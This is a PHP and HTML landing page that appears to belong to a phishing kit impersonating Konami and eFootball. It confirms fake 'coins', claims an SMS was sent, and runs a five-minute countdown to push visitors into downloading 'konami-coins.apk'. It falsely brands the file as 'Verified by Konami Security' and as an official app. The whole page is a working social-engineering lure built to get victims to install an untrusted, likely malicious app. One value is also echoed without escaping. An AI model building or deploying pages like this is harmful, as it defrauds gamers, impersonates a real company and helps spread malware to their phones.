<?php
session_start();
$reward = $_SESSION['reward'] ?? 'Your';
$email = $_SESSION['email'] ?? '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Konami Coins - Install Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(25px);
            border-radius: 25px;
            padding: 50px 40px;
            text-align: center;
            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .success-icon {
            font-size: 4rem;
            background: linear-gradient(135deg, #00ff88, #00cc6a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 15px;
            background: linear-gradient(135deg, #ffffff, #f0f0f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .reward-confirm {
            background: rgba(0,255,136,0.2);
            border: 2px solid rgba(0,255,136,0.4);
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            font-size: 1.4rem;
            font-weight: 600;
        }
        .timer {
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 30px 0;
            text-shadow: 0 0 30px currentColor;
        }
        .apk-info {
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .install-btn {
            display: inline-block;
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            color: white;
            padding: 20px 50px;
            font-size: 1.3rem;
            font-weight: 700;
            text-decoration: none;
            border-radius: 20px;
            margin: 20px 0;
            transition: all 0.3s;
            box-shadow: 0 15px 35px rgba(0,212,255,0.4);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .install-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 25px 50px rgba(0,212,255,0.6);
        }
        .urgency-text {
            color: #ffeb3b;
            font-weight: 600;
            font-size: 1.1rem;
            margin-top: 20px;
        }
        .sms-notice {
            background: rgba(255,193,7,0.2);
            border: 1px solid rgba(255,193,7,0.4);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            font-size: 0.95rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <h1><?php echo htmlspecialchars($reward); ?> Coins Confirmed!</h1>
        
        <div class="reward-confirm">
            ✅ SMS Verification Sent to: <strong><?php echo htmlspecialchars($email); ?></strong>
        </div>
        
        <div class="timer" id="countdown">05:00</div>
        
        <div class="apk-info">
            <h3 style="margin-bottom: 15px; color: #fff;">📱 Install Konami Coins App</h3>
            <p style="line-height: 1.6; margin-bottom: 20px;">
                Your reward will be delivered automatically after installation. 
                <strong>Official Konami app required for coin transfer.</strong>
            </p>
            <a href="konami-coins.apk" class="install-btn" download>📥 INSTALL KONAMI COINS (12MB)</a>
            <p style="font-size: 0.85rem; opacity: 0.9;">✓ Verified by Konami Security ✓ Free Forever</p>
        </div>
        
        <div class="urgency-text">
            ⏰ Reward expires in <span id="countdownText">5 minutes</span>!
        </div>
        
        <div class="sms-notice">
            📱 <strong>Check your SMS now:</strong><br>
            "eFootball: Your <?php echo $reward; ?> coins ready! Install Konami Coins app to claim: [your-link]"
        </div>
    </div>

    <script>
        let timeLeft = 300; // 5 minutes
        const timerEl = document.getElementById('countdown');
        const countdownText = document.getElementById('countdownText');
        
        const timer = setInterval(() => {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerEl.textContent = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
            
            if (timeLeft <= 60) {
                countdownText.textContent = '1 minute';
                timerEl.style.background = 'linear-gradient(135deg, #ff4757, #ff6b6b)';
            }
            
            if (timeLeft <= 0) {
                clearInterval(timer);
                timerEl.textContent = 'EXPIRED!';
                document.querySelector('.install-btn').textContent = 'RESTART CLAIM';
            }
        }, 1000);
    </script>
</body>
</html>
